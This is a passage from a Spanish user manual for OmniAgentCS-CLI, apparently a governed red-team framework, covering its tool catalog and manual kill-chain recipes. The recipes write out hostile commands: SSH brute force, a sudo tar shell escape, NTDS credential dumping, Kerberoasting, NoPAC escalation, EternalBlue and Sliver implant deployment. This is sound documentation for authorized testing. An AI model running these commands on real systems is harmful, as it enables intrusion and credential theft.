# GUÍA MANUAL 1 — Uso manual de las OMNI Tools (OmniAgentCS-CLI)

**Producto:** OmniAgentCS-CLI (`omni`) · BAJIOWARE / Team Red
**Versión cubierta:** `3.0.0`
**Alcance de esta guía:** trabajar un engagement **paso a paso, sin LLM**, eligiendo
tú cada herramienta y sus argumentos. Todo pasa por **la misma puerta gobernada**
que usa el agente (`execute_tool`: policy → scope firmado → aprobación → auditoría
→ verificación).

> La diferencia entre el **modo manual** y el **modo agente** es *quién elige la
> acción*, no *qué se puede ejecutar*. La gobernanza no se relaja nunca.
> El modo autónomo (bucle ReAct) se cubre en **[GUIA_AGENTE_1.md](GUIA_AGENTE_1.md)**.

---

## Índice

1. [Qué es el modo manual](#1-qué-es-el-modo-manual)
2. [Instalación y primer arranque](#2-instalación-y-primer-arranque)
3. [Configuración: rutas, proveedor y secretos](#3-configuración-rutas-proveedor-y-secretos)
4. [La gobernanza que acompaña a toda tool](#4-la-gobernanza-que-acompaña-a-toda-tool)
5. [Preparar el engagement (scope firmado)](#5-preparar-el-engagement-scope-firmado)
6. [Invocar una tool manualmente](#6-invocar-una-tool-manualmente)
7. [Catálogo completo de las 68 tools](#7-catálogo-completo-de-las-68-tools)
8. [Recetas de flujo (kill-chain manual)](#8-recetas-de-flujo-kill-chain-manual)
9. [Comandos de la CLI (`omni`)](#9-comandos-de-la-cli-omni)
10. [Inspección desde el REPL](#10-inspección-desde-el-repl)
11. [Reportes manuales](#11-reportes-manuales)
12. [Variables de entorno](#12-variables-de-entorno)
13. [Códigos de salida y límites](#13-códigos-de-salida-y-límites)

---

## 1. Qué es el modo manual

OMNI tiene **tres formas** de ejecutar sus herramientas durables (`nexus.*`):

| Forma | Quién elige la acción | Contacta al LLM | Punto de entrada |
|---|---|---|---|
| **REPL manual** | Tú, con `omni tool` o pidiendo una tool | No | `omni tool <id> '<json>'` |
| **Script manual** | Tú (uno a uno o en lote) | No | `scripts/omni_tool.py` |
| **Agente autónomo** | El bucle ReAct / planner | Sí | `omni run "<objetivo>"` o REPL |

Ventajas del modo manual:

- **0 tokens y 0 coste de proveedor**: no se construye cliente LLM.
- **Determinista y reproducible**: tú pasas los argumentos exactos.
- **Mismo motor gobernado**: scope, aprobaciones, auditoría y verificación
  post-condición idénticas al agente.
- **Ideal para depurar** una tool o un engagement: un paso, respuesta JSON.

Referencia: `docs/missions/MANUAL_VS_AGENT.md` (comparativa medida de ambos modos).

---

## 2. Instalación y primer arranque

Requiere **Python 3.12+**. Linux y macOS soportados por el CLI/provisioner.

```bash
git clone https://github.com/bajioware/omni-agentcs
cd omni-agentcs
python3.12 -m venv .venv
source .venv/bin/activate
pip install -r requirements-prod.in
mkdir -p ~/.local/bin
ln -s "$PWD/omni.py" ~/.local/bin/omni
export PATH="$HOME/.local/bin:$PATH"
omni
```

Instalación "one-command" (`scripts/install.sh`) resuelve su fuente en este orden:
`$OMNI_SOURCE` → checkout local → `$OMNI_GIT_URL` → PyPI.

```bash
bash scripts/install.sh --dry-run   # ver el plan sin instalar nada
bash scripts/install.sh             # instalar
```

**Primera ejecución:** si no hay config global y hay TTY, corre el **wizard**
(detecta herramientas, ofrece instalaciones, pide proveedor/modelo/API key y
permite crear un engagement firmado de 24 h). No se repite si ya existe config,
ni en CI/tests, ni con `--no-wizard`.

Comprobaciones de entorno:

```bash
omni --doctor --no-wizard          # diagnóstico local
omni --doctor --json               # diagnóstico JSON (sin secretos)
omni --setup                       # verifica TODO el entorno ofensivo (binarios y servicios)
omni --setup --json
omni --setup --install             # genera plan de instalación (no ejecuta)
omni --setup --install --yes       # aplica el plan aprobado
omni --version                     # omni 3.0.0
```

`--setup` evalúa binarios (`nmap`, `hydra`, `gobuster`, `sliver-server`, …),
servicios (`msfrpcd`, team server Sliver) y configuraciones (operator config,
plantillas nuclei, diccionarios, secreto de firma del scope). Los binarios se
instalan por el flujo aprobado `nexus.system.install_tool`.

---

## 3. Configuración: rutas, proveedor y secretos

| Contenido | Ruta por defecto |
|---|---|
| Configuración | `~/.config/omni/config.toml` |
| SQLite | `~/.local/share/omni/control.db` |
| Historial | `~/.local/state/omni/history` |
| Caché | `~/.cache/omni/` |
| Preferencias TUI | `~/.config/omni/tui.json` |

Se respetan `XDG_CONFIG_HOME`, `XDG_DATA_HOME`, `XDG_STATE_HOME`,
`XDG_CACHE_HOME` (rutas absolutas). Precedencia: entorno → `.env` del checkout →
`config.toml` → defaults. La config se escribe atómica con permisos `600` en
directorios `700`.

```bash
omni --config          # editar con $EDITOR
omni --config-path     # imprimir la ruta
omni --reset-config    # respalda .bak y reinicia onboarding
omni --no-wizard       # arrancar sin onboarding
```

**Proveedores LLM** (no hacen falta en modo manual): Groq, OpenAI, Anthropic,
Gemini, Ollama y **Fake** (offline). En modo manual puedes dejar `LLM_PROVIDER=fake`
o no configurar ninguno.

**Secretos/API keys** sin tocar `.env`:

```bash
omni            # entra al REPL
/secrets list
/secrets set GROQ_API_KEY      # el valor se pide oculto, nunca se imprime
/secrets rotate OPENAI_API_KEY
/secrets delete GEMINI_API_KEY
/secrets import-env            # importa al store las claves conocidas del entorno
```

El *store* de secretos tiene prioridad sobre `.env`; el entorno explícito gana a
todo. Backends: keyring del SO o fichero 0600.

---

## 4. La gobernanza que acompaña a toda tool

Cada llamada, manual o del agente, atraviesa el **gateway**:

```
policy  →  scope firmado (HMAC)  →  aprobación durable  →  sandbox  →  ejecución  →  verificación post-condición  →  auditoría encadenada por hash
```

- **Scope (`governed` por defecto):** falta firma HMAC o el secreto, la firma no
  coincide, o venció la ventana → **ejecución denegada**.
  `NEXUS_SCOPE_MODE=lab` acepta scopes sin firmar (registra `scope.unsigned_accepted`)
  y **no debe usarse en producción**.
- **Niveles de riesgo** de cada tool:
  - `READ_ONLY` — no altera nada.
  - `LOW` — efecto mínimo.
  - `MEDIUM` — requiere aprobación según política.
  - `HIGH` — **exige aprobación humana** `y/n/e/?` (o `--trust-mode`).
  - `DESTRUCTIVE` — **siempre** pide aprobación humana, **incluso con `--trust-mode`**.
- **Aprobaciones durables:** cada autorización queda registrada con
  `trust_mode=true` y `trusted_by=<usuario>` cuando aplica trust mode.
- **Sandbox:** `NEXUS_SANDBOX_MODE` = `local` | `local_strict` | `oci` | `oci_network`
  (`oci_network` falla explícitamente: no hay política de egress implementada).
  `local_strict` confina cwd y HOME/argv, pero **no aísla red/procesos del host**.
- **Auditoría:** cadena encadenada por hash; el reporte marca **NO VERIFICADA** si
  la cadena no valida.

**Trust mode** (`--trust-mode` o `/trust on`) auto-aprueba las tools `HIGH` (nunca
las `DESTRUCTIVE`). Úsalo solo en laboratorios controlados.

---

## 5. Preparar el engagement (scope firmado)

Nada se ejecuta contra un objetivo sin un engagement firmado que lo cubra.

```bash
omni --list-engagements
omni --new-engagement scanme-lab --scope "scanme.nmap.org"            # firma y sale
omni --new-engagement lab --scope "10.0.0.1/24" --valid-hours 72   # 72 h de validez
```

El scope separa por comas dominios, CIDRs y URLs. Cada engagement se firma con
`scope.signing_secret` y lleva su ventana de validez (24 h por defecto).

**Dentro del REPL** (crear / listar / cambiar en caliente):

```text
/engage_list
/engage_create lab10 10.0.0.1/24,lab.local --hours 48
/engage_use eng-xxxx
/engage_current            # equivale a /scope
```

**RoE (Reglas de Encuentro)** — opcionales pero recomendadas:

```bash
omni --roe show            # estado y política
omni --roe path            # rutas de la RoE y del kill switch
omni --roe kill            # arma el kill switch (detiene todo)
omni --roe arm             # desarma
```

**Intake guiado** (objetivo, cliente, targets autorizados, restricciones, RoE) en
el REPL con `/interview`. Valida los targets contra el scope y registra un hecho
`hint` durable que el agente reutiliza; nunca amplía una autorización.

Recomendación: antes de tocar el objetivo, `omni --setup --json` para confirmar
que las herramientas que vas a usar existen y son ejecutables.

---

## 6. Invocar una tool manualmente

### 6.1 Listar el catálogo

```bash
omni tool --list
```

Imprime `tool_id<TAB>resumen` de cada tool durable.

### 6.2 Invocar una tool

```bash
omni --engagement eng-xxxx tool nexus.recon.nmap '{"target": "10.0.0.1", "profile": "service"}'
omni --engagement eng-xxxx tool nexus.recon.nmap '{"target": "scanme.nmap.org", "flags": "-sV"}'
omni --engagement eng-xxxx --trust-mode tool nexus.web.nuclei '{"targets": "http://10.0.0.1"}'
```

- Los **flags van antes** del grupo posicional `<tool_id> '<json>'` o después,
  **nunca entre** los dos.
- Los argumentos son un **objeto JSON**.
- Sin engagement, las tools que exigen scope se deniegan fail-closed.
- **Destructivas nunca se auto-aprueban** aquí (no hay stdin interactivo → se
  deniegan).

Salida: el `ToolResult` en JSON, con `success`, `verified`,
`verification_method`, `evidence` y el payload del handler. Códigos: `0` si
verificó la post-condición; `1` denegado/fallido/no verificado; `2` error de uso
(JSON inválido).

### 6.3 Driver script (más cómodo para secuencias y lotes)

```bash
.venv/bin/python scripts/omni_tool.py --list
.venv/bin/python scripts/omni_tool.py --engagement eng-xxxx \
    nexus.recon.nmap '{"target": "10.0.0.1", "flags": "-sV"}'
```

`--trust-mode` está **activo por defecto** en este driver (las `HIGH` se
auto-aprueban; las `DESTRUCTIVE` siguen denegadas por falta de stdin).

**Modo lote (`--batch`)**: un fichero **NDJSON** con un job por línea
(`{"tool_id": ..., "arguments": {...}}`) se ejecuta por el **mismo** punto de
entrada gobernado, con concurrencia global y por-target acotadas:

```bash
.venv/bin/python scripts/omni_tool.py --engagement eng-xxxx \
    --batch jobs.ndjson --out results.ndjson \
    --max-concurrency 4 --per-target 1
```

Cada job termina en `completed`, `failed` o `cancelled` (un negativo determinado
se registra, no se descarta).

### 6.4 Aprobaciones interactivas

Cuando una tool exige aprobación, la respuesta es `y`/`n`/`e`/`?`:

- `y` (yes/si) — aprueba esa invocación.
- `n` (no) — deniega.
- `e` — “kill all” en `kill-session`; en el resto, cancela por defecto.
- `?` — ayuda sobre la aprobación.

---

## 7. Catálogo completo de las 68 tools

Columnas: **id** · **riesgo** · **scope** (campo del objetivo) · **argumentos
requeridos** · **opcionales clave**. `—` en scope = no exige engagement.

> `effect` (taxonomía interna) y `sandbox_required` se indican donde aportan
> (p. ej. `read_only`, `exploit`, `lateral_movement`).

### 7.1 Sistema, workspace y memoria

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.system.status` | read_only | — | — | — |
| `nexus.system.check_env` | read_only | — | — | `tools`, `verify_sandbox` |
| `nexus.system.install_tool` | high | — | `tool_name` | `manager` (apt/dnf/yum/pacman/zypper/snap/flatpak/brew/port/go/cargo/pipx/pip), `dry_run` |
| `nexus.workspace.search` | read_only | — | `query` | — |
| `nexus.workspace.read` | read_only | — | `path` | `max_bytes` |
| `nexus.knowledge.record_fact` | low (`state_write`) | — | `fact_type`, `key` | `value`, `source`, `verified` |
| `nexus.knowledge.query_facts` | read_only | — | — | `fact_type`, `limit` |
| `nexus.orchestrator.playbook` | read_only | — | — | `action` (`list`/`next`/`show`), `playbook_id` |
| `nexus.report.generate` | read_only (`report`) | — | — | `engagement_id`, `format` (`markdown`/`html`/`both`/`sarif`), `include_failed_attempts`, `output_dir`, `llm_cvss`, `enrich_cves` |

`fact_type` ∈ `host, service, web_app, endpoint, user, email, credential, access,
privilege, vulnerability, session, artifact, loot, hint`.

`install_tool` es **HIGH** y siempre requiere aprobación del plan exacto; el
modelo **nunca** aporta `argv`, solo elige `tool_name` + `manager` del catálogo.

### 7.2 Reconocimiento

| Tool | Riesgo | Scope (campo) | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.recon.nmap` | medium | `target` | `target` | `profile` (`quick`/`full_tcp`/`service`/`top_udp`), `flags`, `timeout_seconds` |
| `nexus.recon.dns` | low | `target` | `target`, `name` | `record_type` (A/AAAA/CNAME/MX/NS/SOA/SRV/TXT/PTR/ANY), `timeout_seconds` |
| `nexus.recon.subfinder` | read_only | `domain` | `domain` | `timeout_seconds` |
| `nexus.recon.httpx` | low | `targets` | `targets` | `probe`, `tech_detect`, `timeout_seconds` |
| `nexus.recon.ftp` | low | `target` | `target` | `action` (`list`/`download`), `remote_path`, `port`, `username`, `password`, `timeout_seconds` |
| `nexus.recon.gobuster` | medium | `target` | `mode`, `target`, `wordlist` | `mode` (`dir`/`dns`/`vhost`), `extensions`, `threads`, `status_codes`, `exclude_length`, `timeout_seconds` |
| `nexus.recon.nikto` | medium | `target` | `target` | `ports`, `ssl`, `tuning`, `evasion`, `pause`, `user_agent`, `request_timeout`, `maxtime_seconds`, `timeout_seconds` |
| `nexus.recon.whatweb` | low | `targets` | `targets` | `aggression` (`1`/`3`/`4`), `timeout_seconds`, `user_agent` |
| `nexus.recon.netexec` | medium | `target` | `protocol`, `target` | `protocol` (`smb`/`ldap`), `operation` (fingerprint/shares/users/groups/smb_sessions/disks/pass_pol/loggedon_users/computers/dc_list/active_users/rid_brute/delegation), `domain`, `username`, `password`, `hash`, `threads`, `flags` |
| `nexus.recon.smb` | low | `target` | `target` | `action` (`shares`/`list`/`get`), `share`, `remote_path`, `local_path`, `username`, `password`, `hash` (pass-the-hash) |
| `nexus.recon.bloodhound_python` | medium | `dc` | `domain`, `dc` | `collection`, `username`, `password`, `hash`, `auth_method` (`ntlm`/`kerberos`/`auto`), `nameserver`, `workers`, `flags` |

Notas: `nmap` es `idempotent`; `httpx` es `idempotent`; `nikto` es ruidoso
(`noise_level` siempre `high`); `gobuster` requiere wordlist en workspace o ruta
de sistema (p. ej. `/usr/share/dirb/wordlists/common.txt`).

### 7.3 Credenciales

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.cred.bruteforce` | medium | `target` | `target`, `service`, `password_file` | `service` (`ssh`/`ftp`/`telnet`/`tcp`), `username`, `password_prompt`, `login_prompt`, `success_marker`, `port`, `max_attempts`, `timeout_seconds` |

Prueba usuario + wordlist del workspace; wordlist confinada al workspace,
intentos acotados.

### 7.4 Web

| Tool | Riesgo | Scope (campo) | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.web.nuclei` | medium | `targets` | `targets` | `flags`, `templates`, `tags`, `timeout_seconds` |
| `nexus.web.ffuf` | medium | `url` | `url`, `wordlist` | `extensions`, `method` (GET/POST/HEAD), `threads`, `rate`, `flags`, `vhost`, `timeout_seconds` |
| `nexus.web.sqlmap` | medium (`exploit`) | `url` | `url` | `data`, `cookie`, `level`, `risk`, `technique`, `dbms`, `tamper`, `safe_mode`, `timeout_seconds` |
| `nexus.web.dalfox` | medium | `target` | `target` | `method` (GET/POST), `data`, `cookies`, `headers`, `workers`, `blind`, `deep_domxss`, `timeout_seconds` |
| `nexus.web.request` | medium (`target_write`) | `url` | `url` | `method` (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS), `headers`, `data`, `data_base64`, `upload`, `follow_redirects`, `insecure`, `save_path`, `max_download_bytes`, `max_response_bytes`, `timeout_seconds` |
| `nexus.web.upload` | medium (`target_write`) | `url` | `url`, `upload` | `method` (POST/PUT), `headers`, `follow_redirects`, `insecure`, `save_path`, `max_download_bytes`, `max_response_bytes`, `timeout_seconds` |
| `nexus.web.git_dump` | medium | `url` | `url` | `max_objects` (def. 1000), `timeout_seconds` (def. 120) |
| `nexus.web.wp_enum` | low | `url` | `url` | `max_users`, `timeout_seconds` |
| `nexus.web.wp_bruteforce` | high | `url` | `url`, `username`, `password_file` | `transport` (`xmlrpc`/`wp-login`), `workers`, `offset`, `max_attempts`, `timeout_seconds` |
| `nexus.web.wp_exec` | high (`exploit`) | `url` | `url`, `username`, `password` | `theme`, `file`, `commands`, `payload_file`, `restore` (def. true), `timeout_seconds` |

Notas: `nuclei` necesita templates instalados y `NEXUS_NUCLEI_TEMPLATES`
apuntando a su directorio (el handler **no** los descarga). `sqlmap` corre en
modo batch, solo detección por defecto. `wp_exec` escribe el payload, ejecuta y
**restaura** el fichero original al terminar.

### 7.5 Explotación (Metasploit / Exploit-DB)

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.exploit.searchsploit` | read_only | — | — | `query`, `cve`, `exact`, `json`, `exclude` |
| `nexus.exploit.msf_search` | read_only | — | — | `query`, `module_type` (exploit/auxiliary/post/payload/encoder/nop/evasion), `platform`, `cve`, `limit` |
| `nexus.exploit.msf_auxiliary` | medium | `target` | `module`, `target` | `options`, `timeout_seconds` |
| `nexus.exploit.msf_exploit` | high | `target` | `module`, `target` | `options`, `payload`, `lhost`, `lport`, `timeout_seconds` |

Reglas de `msf_exploit`: el modelo **nunca** elige el callback; `LHOST`/`LPORT`
salen de `MSF_LHOST`/`MSF_LPORT`. `PROXIES`/`RHOSTS`/`LHOST`/`LPORT` se rechazan
dentro de `options`. Un exploit que corre sin abrir sesión devuelve
`status=timeout` con `verified=true`.

### 7.6 Active Directory (Impacket / NoPAC)

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.attack.impacket_secretsdump` | high | `target` | `target` | `domain`, `username`, `password`, `hash`, `method` (`all`/`ntds`/`ntds_ntlm`), `just_dc_user`, `dc_ip`, `target_ip`, `skip_sam`, `skip_security`, `history`, `flags` |
| `nexus.attack.impacket_getuserspns` | medium | `dc_ip` | `dc_ip`, `domain`, `username` | `password`, `hash`, `request`, `request_user`, `dc_host`, `flags` |
| `nexus.attack.impacket_psexec` | **destructive** | `target` | `target`, `username`, `command` | `domain`, `password`, `hash`, `port`, `service_name`, `target_ip`, `flags` |
| `nexus.attack.impacket_changepasswd` | high | `target` | `target`, `account`, `domain`, `new_password` | `old_password`, `alt_username`, `alt_password`, `alt_hash`, `protocol` (`smb-samr`/`rpc-samr`/`kpasswd`/`ldap`), `timeout_seconds` |
| `nexus.attack.nopac` | high | `target` | `target`, `domain`, `username` | `password`, `hash`, `dc_host`, `dc_fqdn`, `impersonate`, `computer_name`, `machine_password`, `cleanup` (def. true), `timeout_seconds` |

Notas: `secretsdump` `-outputfile` es un **prefijo** → genera `.sam`, `.secrets`,
`.cached`, `.ntds`. `changepasswd` verifica re-autenticando con la credencial
nueva. `nopac` escala a DA en DC sin parchear (CVE-2021-42278 + 42287) y **borra
la cuenta de máquina** que crea (`cleanup`).

### 7.7 Post-explotación y ejecución

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.post.ssh_exec` | high | `target` | `target`, `username`, `password`, `command` | `port`, `timeout_seconds` |
| `nexus.post.ssh_upload` | medium | `target` | `target`, `username`, `password`, `local_path`, `remote_path` | `file_mode`, `make_dirs`, `port`, `timeout_seconds` |
| `nexus.post.enum_system` | medium | `target` | `target`, `username`, `password` | `port`, `timeout_seconds` |
| `nexus.post.privesc_hints` | read_only | — | — | `sudo_rules`, `suid`, `capabilities` |
| `nexus.post.shell_exec` | high | — | `transport`, `session_id`, `command` | `transport` (`metasploit`/`sliver`/`webshell`), `url`, `parameter` (def. cmd), `timeout_seconds` |
| `nexus.post.job` | medium (`target_write`) | — | `action` | `action` (`start`/`status`), `tool_id`, `arguments`, `job_id`, `approval_id` |
| `nexus.post.listener` | high | — | `port` | `bind_host`, `timeout_seconds`, `idle_seconds`, `commands`, `max_output_bytes` |
| `nexus.post.ntlm_capture` | high | — | `port` | `bind_host`, `target_name`, `timeout_seconds`, `idle_seconds`, `max_connections`, `max_output_bytes`, `tls_cert`, `tls_key` |
| `nexus.post.tftp` | high | `target` | `target`, `remote_file` | `port`, `action` (`put`/`get`), `local_file`, `mode` (`octet`/`netascii`), `timeout_seconds` |
| `nexus.post.dns_update` | medium | `target` | `target`, `zone`, `name`, `value` | `record_type` (A/AAAA/CNAME/TXT), `action` (`add`/`delete`), `ttl` (def. 60), `timeout_seconds` |
| `nexus.post.dpapi` | medium | — | `action` | `action` (`unwrap`/`open_kdbx`), `blob_file`, `masterkey`, `entropy`, `kdbx_file`, `material`, `material_file`, `max_entries`, `timeout_seconds` |
| `nexus.post.pivot_bruteforce` | high | `target` | `target`, `username`, `password`, `form_url`, `form_username`, `failure_marker`, `password_file` | `port`, `session_url`, `form_user_field`, `form_pass_field`, `extra_fields`, `success_marker`, `offset`, `max_attempts`, `workers`, `timeout_seconds` |
| `nexus.post.pivot_http` | high | `target` | `target`, `username`, `password`, `url` | `port`, `method`, `body`, `content_type`, `headers`, `session_url`, `login_url`, `login_username`, `login_password`, `login_user_field`, `login_password_field`, `login_extra_fields`, `login_failure_marker`, `token_url`, `token_field`, `token_header`, `max_body_bytes`, `request_timeout`, `timeout_seconds` |
| `nexus.post.smb_upload` | medium | `target` | `target`, `share`, `local_path`, `remote_path` | `username`, `password`, `timeout_seconds` |

`enum_system` recolecta identidad, usuarios, `sudo -l`, SUID, capabilities y cron.
`privesc_hints` correlaciona eso con GTFOBins y **no ejecuta nada**. `listener` y
`ntlm_capture` escuchan **una** conexión: lánzalas en segundo plano y dispara la
conexión con otra tool.

### 7.8 Pwning (ELF remoto por SSH)

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.pwn.analyze` | medium | `target` | `target`, `username`, `password`, `remote_path` | `libc_remote_path`, `port`, `timeout_seconds` |
| `nexus.pwn.ret2libc` | high | `target` | `target`, `username`, `password`, `remote_path` | `command`, `libc_remote_path`, `offset`, `pop_rdi`, `gets_plt`, `puts_plt`, `puts_got`, `main`, `puts_off`, `system_off`, `binsh_off`, `writable`, `port`, `max_attempts`, `timeout_seconds` |

`analyze` es solo lectura (protecciones PIE/NX/RELRO/canary, símbolos, PLT/GOT,
gadgets, offset del overflow). `ret2libc` explota un setuid: leak de `puts`
(stage 1) + `system(comando)` (stage 2).

### 7.9 Windows remoto

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.win.winrm_exec` | high | `target` | `target`, `username`, `command` | `domain`, `password`, `hash`, `shell` (`cmd`/`powershell`), `port`, `timeout_seconds` |

### 7.10 Sesiones y C2 (Metasploit / Sliver)

| Tool | Riesgo | Scope | Args requeridos | Opcionales clave |
|---|---|---|---|---|
| `nexus.session.list` | read_only | — | — | `filter_type` (meterpreter/shell/powershell/all) |
| `nexus.session.kill` | medium | — | `session_uuid` | — |
| `nexus.session.interact` | high | — | `session_uuid`, `command` | `max_wait_seconds` |
| `nexus.c2.sliver_server` | read_only | — | — | — |
| `nexus.c2.sliver_implants` | read_only | — | — | `kind` (`builds`/`profiles`/`both`) |
| `nexus.c2.sliver_sessions` | read_only | — | — | `kind` (`sessions`/`beacons`/`both`) |
| `nexus.c2.sliver_exec` | high | — | `session_id`, `command` | `kind` (`session`/`beacon`), `timeout_seconds` |
| `nexus.c2.sliver_pivot` | high | — | `session_id`, `action` | `action` (`portfwd`/`socks5`/`list`/`kill`), `kind`, `bind_port`, `remote_host`, `remote_port`, `forward_id` |
| `nexus.c2.sliver_generate` | high | — | `os`, `arch` | `format` (executable/shared/shellcode/service), `beacon`, `interval`, `jitter`, `name`, `persistent` |
| `nexus.c2.sliver_deploy` | **destructive** | — | `session_id`, `remote_path`, `os`, `arch` | `action` (`lateral`), `kind`, `format`, `beacon`, `interval`, `jitter`, `name`, `persistent`, `args`, `run` (def. true) |
| `nexus.c2.sliver_loot` | low (`state_write`) | — | — | `action` (`list`/`get`/`record`), `loot_id`, `name`, `with_content` |

Notas Sliver (gRPC/mTLS, vía `SLIVER_OPERATOR_CONFIG`): `generate` **nunca**
devuelve los bytes (solo nombre, tamaño y SHA256); `deploy` sube y ejecuta un
implante en un host nuevo (movimiento lateral) y la nueva sesión queda registrada
como evidencia; `loot` con `record` persiste un hecho `loot` con su SHA256 (cadena
de custodia). Todas fallan cerrado (`verified=false` con
`sliver_unavailable`/`sliver_auth_missing`) si el server o el config no están.

---

## 8. Recetas de flujo (kill-chain manual)

Todas las llamadas pasan por el gateway; con `--trust-mode` auto-apruebas las
`HIGH` y las `DESTRUCTIVE` siguen pidiendo confirmación.

### 8.1 Barrido inicial

```bash
omni --engagement eng-x tool nexus.recon.nmap '{"target":"10.0.0.1","profile":"full_tcp"}'
omni --engagement eng-x tool nexus.recon.nmap '{"target":"10.0.0.1","profile":"service"}'
omni --engagement eng-x tool nexus.recon.httpx '{"targets":"http://10.0.0.1","tech_detect":true}'
```

### 8.2 FTP anónimo → credenciales (playbook `ftp_anon_to_cred`)

```bash
omni --engagement eng-x tool nexus.recon.ftp  '{"target":"10.0.0.1","action":"list"}'
omni --engagement eng-x tool nexus.recon.ftp  '{"target":"10.0.0.1","action":"download","remote_path":"locks.txt"}'
omni --engagement eng-x tool nexus.workspace.read '{"path":"locks.txt"}'
omni --engagement eng-x --trust-mode tool nexus.cred.bruteforce \
    '{"target":"10.0.0.1","service":"ssh","username":"lin","password_file":"locks.txt"}'
```

### 8.3 Linux privesc (playbook `linux_privesc`)

```bash
omni --engagement eng-x --trust-mode tool nexus.post.enum_system \
    '{"target":"10.0.0.1","username":"lin","password":"REDACTED"}'
omni --engagement eng-x tool nexus.post.privesc_hints '{"sudo_rules":"(root) NOPASSWD: /usr/bin/tar"}'
omni --engagement eng-x --trust-mode tool nexus.post.ssh_exec \
    '{"target":"10.0.0.1","username":"lin","password":"REDACTED","command":"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}'
```

### 8.4 AD

```bash
omni --engagement eng-x tool nexus.recon.netexec '{"protocol":"smb","target":"10.0.0.1"}'
omni --engagement eng-x tool nexus.recon.netexec '{"protocol":"smb","target":"10.0.0.1","operation":"shares"}'
omni --engagement eng-x tool nexus.recon.bloodhound_python '{"domain":"windcorp.thm","dc":"10.0.0.1","username":"u","password":"p"}'
omni --engagement eng-x --trust-mode tool nexus.attack.impacket_getuserspns '{"dc_ip":"10.0.0.1","domain":"windcorp.thm","username":"u","request":true}'
omni --engagement eng-x --trust-mode tool nexus.attack.impacket_secretsdump '{"target":"10.0.0.1","domain":"windcorp.thm","username":"u","password":"p","method":"ntds"}'
omni --engagement eng-x --trust-mode tool nexus.attack.nopac '{"target":"10.0.0.1","domain":"windcorp.thm","username":"u","password":"p","dc_host":"FIRE","dc_fqdn":"fire.windcorp.thm"}'
```

### 8.5 Metasploit y sesiones

```bash
omni --engagement eng-x tool nexus.exploit.msf_search '{"query":"eternalblue"}'
omni --engagement eng-x --trust-mode tool nexus.exploit.msf_exploit \
    '{"module":"exploit/windows/smb/ms17_010_eternalblue","target":"10.0.0.1"}'
omni --engagement eng-x tool nexus.session.list
omni --engagement eng-x --trust-mode tool nexus.session.interact '{"session_uuid":"abc123","command":"sysinfo"}'
omni --engagement eng-x tool nexus.session.kill '{"session_uuid":"abc123"}'
```

### 8.6 Preguntar al plan/playbook sin ejecutar

```bash
omni --engagement eng-x tool nexus.orchestrator.playbook           # siguiente paso sugerido
omni --engagement eng-x tool nexus.orchestrator.playbook '{"action":"list"}'
omni --engagement eng-x tool nexus.orchestrator.playbook '{"action":"show","playbook_id":"linux_privesc"}'
```

---

## 9. Comandos de la CLI (`omni`)

### 9.1 Flags globales

| Flag | Qué hace |
|---|---|
| `--engagement ID` | Fija el engagement activo (scope firmado). |
| `--continue ID` | Retoma un engagement y su conversación persistente. |
| `--tenant NOMBRE` | Tenant de trabajo (def. `system`). |
| `--objective TEXTO` | Ejecuta un objetivo one-shot y sale (sin REPL). |
| `--stream-json` | Modo headless: NDJSON por línea y sale. |
| `--skill NOMBRE` | Activa una skill `.agents/skills/<NOMBRE>/SKILL.md` (repetible). |
| `--max-iterations N` | Máximo de iteraciones del bucle ReAct (def. 12). |
| `--subagent ID` | Fija el perfil de subagente del run. |
| `--no-color` | Desactiva ANSI. |
| `--no-tui` | Usa readline en lugar de la TUI. |
| `--no-fullscreen` / `--fullscreen` | Modo inline (no alt-screen) / pantalla dedicada. |
| `--trust-mode` | Auto-aprueba tools `HIGH` (nunca `DESTRUCTIVE`); cada auto-aprobación se audita. |
| `--resume RUN_ID` | Retoma un run previo. |
| `--resume-policy` | Con `--resume` headless: `approve`\|`skip`\|`fail` para invocaciones `unknown`. |
| `--autospawn` / `--no-autospawn` | Delega a subagente hijo al cambiar de fase (opt-in). |
| `--supervisor-budget TOKENS` | Presupuesto global del árbol de subagentes (0 = sin delegación). |
| `--list-engagements` | Lista engagements y sale. |
| `--roe [ACCIÓN]` | RoE del engagement: `show`(def.)/`path`/`kill`/`arm`. |
| `--new-engagement NOMBRE` | Crea engagement firmado con `--scope` y sale. |
| `--scope DOMINIOS/CIDRS` | Alcance autorizado para `--new-engagement`. |
| `--valid-hours N` | Validez en horas (def. 24). |
| `--format FMT` | Con `report`: `markdown`\|`html`\|`both`\|`sarif`. |
| `--output DIR` | Con `report`: directorio de salida. |
| `--doctor`, `--json` | Diagnóstico (texto o JSON). |
| `--setup`, `--install`, `--yes` | Verificación/instalación del entorno ofensivo. |
| `--config`, `--config-path`, `--reset-config` | Config TOML. |
| `--no-wizard` | Omite onboarding interactivo. |
| `--about`, `--banner` | Banner ASCII completo (y sale / al arrancar). |
| `--version` | `omni 3.0.0`. |

### 9.2 Subcomandos

| Subcomando | Uso |
|---|---|
| `omni run "<objetivo>" [--json\|--stream-json]` | Run headless (agente). |
| `omni tool --list` / `omni tool <id> '<json>'` | **Invocación manual gobernada** (esta guía). |
| `omni report [--format FMT] [--output DIR]` | Genera el entregable del engagement. |
| `omni cve update [CVE-AAAA-NNNN ...]` | Rellena caché NVD/EPSS/CISA KEV (explícito). |
| `omni hooks trust\|list\|revoke <path>` | Aprueba/revoca hooks de repositorio (`.agents/hooks.json`). |
| `omni resume <run_id> [--retry ID \| --skip ID]` | Resuelve invocaciones `unknown` tras un crash. |

Ejemplos:

```bash
omni report --format both --output ./entregable
omni cve update CVE-2021-42278 CVE-2021-42287
omni hooks list
omni resume run-abc --retry inv-123
```

---

## 10. Inspección desde el REPL

